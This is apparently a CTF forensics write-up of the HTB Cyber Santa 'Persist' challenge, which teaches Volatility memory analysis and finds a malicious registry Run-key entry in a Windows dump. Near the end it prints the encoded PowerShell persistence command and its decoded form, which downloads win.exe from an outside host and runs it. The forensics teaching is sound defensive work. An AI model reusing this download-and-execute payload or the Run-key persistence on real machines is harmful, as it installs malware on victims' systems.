---
layout: post
title: "HTB Cyber Santa Writeups: Persist"
image: ''
date:   2021-12-08 00:00:00
tags:
- hackthebox
- htb-cyber-santa
- dfir
- volatility
- AutoRun
description: ''
categories:
published: false
comments: false
---

![intro](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211205131825.png)

## Intro
Persist was the forensics challenge released on day 3, where we're given a memory dump of Santa's computer, which reportedly has a "slow boot time and a blue window popping up for a split second during startup". We'll take this as a cue to investigate AutoRun Persistence in Windows, and find a Volatility plugin called "winesap" which will show us a number of registry keys, one of which that contains a suspicious PowerShell script that we can decode to get the flag.

* buh
{:toc}

### Description
`Although Santa just updated his infra, problems still occur. He keeps complaining about slow boot time and a blue window popping up for a split second during startup. The IT elves support suggested that he should restart his computer. Ah, classic IT support!  
Download Link: http://46.101.25.140/forensics_persist.zip`

## Intro to Volatility
### Background
Two of the five forensics challenges during this CTF had to do with memory dumps, which many struggled with since they had never had to do memory forensics before. Since the solution to this challenge is pretty quick with the right tools, I'll take this time to explain the basics of **Volatility**, the de facto tool for memory forensics.

According to the developers' webpage, [Volatility](https://www.Volatilityfoundation.org/) "introduced people to the power of analyzing the runtime state of a system using the data found in volatile storage (RAM). It also provided a cross-platform, modular, and extensible platform to encourage further work into this exciting area of research." 

Prior to this research, most forensics involved looking at the hard drive image. However, this method of analysis can only find things on-disk, so the running state of processes were not stored at all. The primary difference between volatile and nonvolatile memory is that volatile memory requires constant electrical current. To keep it simple, if I removed the battery from your device right now, the photos and documents you have on the disk will remain, but the state of your browser probably won't. The browser was an active process in RAM, but the other files you had on your device weren't being modified at all.

History and tech lesson over, let's talk about using the tool.

### Basic Usage
I've already downloaded the dump on my Remnux VM, as the distro already has Volatility installed. I'll be working out of Volatility 2, since version 3 is a bit finnicky with installing the symbol libraries and all.

`imageinfo` is almost always the first thing you'll use, so you can find the correct profile to give Volatility to parse the dump correctly. We also get some additional information about the OS. 
```bash
remnux@remnux:~/ctf/santa/persist$ vol.py -f persist.raw imageinfo
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/remnux/ctf/santa/persist/persist.raw)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82977c68L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82978d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2021-11-30 22:05:35 UTC+0000
     Image local date and time : 2021-11-30 14:05:35 -0800
```

From here, you'll be able to specify the profile using the `--profile` flag, and then proceed to do pretty much whatever. The framework is plugin-based, so each "command" has its own subset of things to do, but we'll only cover some basic plugins here. The `pslist` and the `pstree` plugins can be used to view the current list of processes, one as a list, and the other as a tree, respectively. 

```bash
remnux@remnux:~/ctf/santa/persist$ vol.py --profile=Win7SP1x86_23418 -f persist.raw pslist
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x8413a940 System                    4      0     76      512 ------      0 2021-11-30 22:05:03 UTC+0000                                 
0x90dfebd8 smss.exe                236      4      4       32 ------      0 2021-11-30 22:05:03 UTC+0000                                 
0x856dbb00 csrss.exe               312    304      8      473      0      0 2021-11-30 22:05:03 UTC+0000                                 
0x8504c750 wininit.exe             352    304      7       90      0      0 2021-11-30 22:05:04 UTC+0000                                 
0x84f54818 csrss.exe               364    344      7      179      1      0 2021-11-30 22:05:04 UTC+0000                                 
0x858ab588 services.exe            404    352     24      265      0      0 2021-11-30 22:05:04 UTC+0000                                 
0x8571fd28 lsass.exe               412    352      9      647      0      0 2021-11-30 22:05:04 UTC+0000                                 
0x8571d838 lsm.exe                 420    352     12      188      0      0 2021-11-30 22:05:04 UTC+0000                                 
0x85875260 winlogon.exe            496    344      6      121      1      0 2021-11-30 22:05:05 UTC+0000                                 
0x85811030 svchost.exe             576    404     15      369      0      0 2021-11-30 22:05:05 UTC+0000                                 
0x85894530 VBoxService.ex          640    404     14      125      0      0 2021-11-30 22:05:05 UTC+0000                                 
...[trim]...
0x85c5bb00 userinit.exe           2656   2416      4       47      2      0 2021-11-30 22:05:19 UTC+0000                                 
0x85c5d998 dwm.exe                2664    864      4       86      2      0 2021-11-30 22:05:19 UTC+0000                                 
0x85c60ab8 explorer.exe           2676   2656     35      655      2      0 2021-11-30 22:05:19 UTC+0000                                 
0x85c8c830 VBoxTray.exe           2796   2676     16      146      2      0 2021-11-30 22:05:19 UTC+0000                                 
0x84a52d28 DumpIt.exe             3340   2676      2       37      2      0 2021-11-30 22:05:29 UTC+0000                                 
0x84a52478 conhost.exe            3352   2388      2       50      2      0 2021-11-30 22:05:29 UTC+0000                                 
0x85b363c0 dllhost.exe            3412    576      6        3      2      0 2021-11-30 22:05:36 UTC+0000   
```

I've only shown the `pslist` output here, but you really should use both in your analysis. The goal of memory forensics is to find anomalies, or occurences that aren't normal for the operating system. You can ignore the `DumpIt.exe` process; this is one of many processes that are used to actually dump the memory in practice.

The final plugin we'll talk about for now is `netscan`, which can be used to basically check `netstat` at the time of the dump.

```bash
remnux@remnux:~/ctf/santa/persist$ vol.py --profile=Win7SP1x86_23418 -f persist.raw netscan
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x2d34e50          TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        268      sshd.exe       
0x2d34e50          TCPv6    :::22                          :::0                 LISTENING        268      sshd.exe       
0x205cad58         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        412      lsass.exe      
0x205cad58         TCPv6    :::49156                       :::0                 LISTENING        412      lsass.exe      
0x211f5f60         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        412      lsass.exe      
...[trim]...  
0x3e5035a8         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
0x3e5035a8         TCPv6    :::445                         :::0                 LISTENING        4        System         
0x3e527cc0         TCPv4    0.0.0.0:22                     0.0.0.0:0            LISTENING        268      sshd.exe       
0x3e614b48         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        352      wininit.exe    
0x3e614b48         TCPv6    :::49152                       :::0                 LISTENING        352      wininit.exe    
0x3e6a73b0         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        696      svchost.exe    
0x3e6a73b0         TCPv6    :::135                         :::0                 LISTENING        696      svchost.exe    
0x3e6b8b88         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        696      svchost.exe    
0x3e6b92c0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        352      wininit.exe    
0x3e6daa58         TCPv4    10.0.2.15:139                  0.0.0.0:0            LISTENING        4        System         
0x3e6ed380         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        748      svchost.exe    
0x3e787770         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        904      svchost.exe    
0x3e788bf0         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        904      svchost.exe    
0x3e788bf0         TCPv6    :::49154                       :::0                 LISTENING        904      svchost.exe    
0x3e5fb770         TCPv4    10.0.2.15:49159                51.104.136.2:443     CLOSED           -1                      
0x3f1e9d08         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        748      svchost.exe    
0x3f1e9d08         TCPv6    :::49153                       :::0                 LISTENING        748      svchost.exe    
```

There are many, many other plugins to dig into, and there are many cheat sheets online to aid you while learning how to use the tool. Also note that you can use the `-h` flag on any plugin to see what additional options you may have.

## Grabbing the Flag
### Persistence 101
Now that we have a basic understanding of the tool, let's look back at the description. Santa is supposedly seeing "slow boot time and a blue window popping up for a split second during startup". Given the title of the challenge, this is a huge hint. The idea of "persistence" is fairly simple: as an attacker, leave yourself some way to get back in if you lose your shell. Between Linux and Windows, there are many, many ways that this can be achieved, including SSH keys, Golden/Silver tickets, Scheduled Tasks and/or cronjobs, etc. These, by no means, are bad options, but we can go deeper.

We could be dealing with a rootkit, code that is planted at a lower-level in the operating system to maintain persistence. However, a much simpler option that matches the description would be AutoRun.

The MITRE ATT&CK Framework describes this subtechnique like so:
> "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [[1]](http://msdn.microsoft.com/en-us/library/aa376977) These programs will be executed under the context of the user and will have the account's associated permissions level." -- [MITRE, Technique 1547.001](https://attack.mitre.org/techniques/T1547/001/)

Basically, an attacker might have added a registry key that allows them to run a script everytime Santa boots up his computer. This is actually a lot closer to our description than the rootkit, as the Registry key is likely to contain some kind of executable or PowerShell, which might be the source of the "blue screen".

### winesap
During the CTF, I was having a lot of trouble getting the [`autoruns`](https://github.com/tomchop/volatility-autoruns) plugin to work, which is basically designed to investigate this kind of stuff. After some research into alternatives, I learned about winesap, from this very well done tutorial by [13Cubed](https://www.youtube.com/watch?v=shF8hAprD4g). The TL;DW is that [this paper](https://www.researchgate.net/publication/332616964_Characteristics_and_detectability_of_Windows_auto-start_extensibility_points_in_memory_forensics) dives deeper into the concept of "autorun persistence", and the "winesap" plugin was developed to find anomalies.

I've been unable to locate the original repository for this plugin from the tutorial, but I did find a clone of it on GitHub which you can find [here](https://github.com/reverseame/winesap). I'll clone it on my VM, and run the plugin like so.

```bash
remnux@remnux:~/ctf/santa/persist$ vol.py --plugin=winesap/ --profile=Win7SP1x86_23418 -f persist.raw winesap
Volatility Foundation Volatility Framework 2.6.1
/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends.openssl import backend
------------------------------
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
cmFuZG9tCg: REG_SZ: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -enc JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=
^CInterrupted
```

There's supposed to be a `--match` flag, but I guessed this bypassed it, somehow. We can take this base64 and decode it to see what's up.

```bash
remnux@remnux:~/ctf/santa/persist$ echo '...[base64 from before]...' | base64 -d
$Path = 'C:\ProgramData\windows\win.exe';if (-NOT(Test-Path -Path $Path -PathType Leaf)){Start-Process $Path}else{mkdir 'C:\ProgramData\windows';$flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";iex (New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/win.exe",$Path);Start-Process $Path}%
```

Well look at that, there's the flag. 